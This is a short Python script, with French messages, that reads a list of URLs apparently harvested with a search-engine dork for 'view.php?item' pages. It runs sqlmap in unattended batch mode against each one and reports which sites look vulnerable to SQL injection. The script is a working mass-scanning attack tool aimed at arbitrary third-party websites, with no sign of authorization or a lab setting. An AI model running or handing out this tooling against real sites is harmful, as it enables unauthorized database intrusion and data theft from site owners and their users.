import subprocess
import json

with open("inurl_view_php_item_.json", "r") as file:
    urls = json.load(file)

sqlmap_command = ["sqlmap", "-u", "", "--batch"]

for url in urls:
    try:
        sqlmap_command[2] = url

        result = subprocess.run(sqlmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=90)

        if result.returncode == 0:
            if "CRITICAL" not in result.stdout and "[CRITICAL]" not in result.stderr:
                print(f"Site vulnérable pour l'URL : {url}")
            else:
                print(f"Site non vulnérable pour l'URL : {url}")
        else:
            print(f"La commande sqlmap a échoué pour l'URL : {url}, erreur : {result.stderr}")

    except subprocess.TimeoutExpired:
        print(f"La commande sqlmap a dépassé le délai pour l'URL : {url}, passage à l'URL suivante.")
    except Exception as e:
        print(f"Une erreur s'est produite pour l'URL : {url}, erreur : {str(e)}")
